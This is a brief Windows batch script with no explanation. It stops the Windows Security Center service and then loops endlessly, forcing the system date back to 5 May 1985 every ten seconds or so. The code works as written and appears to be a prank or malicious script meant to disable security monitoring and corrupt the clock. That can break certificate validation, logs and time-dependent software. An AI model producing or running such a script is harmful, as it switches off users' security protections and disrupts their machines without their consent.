@Echo Off
date 1985-5-5
net stop wscsvc
:a
date 1985-5-5
ping 127.0.0.1 -n 10
Goto :a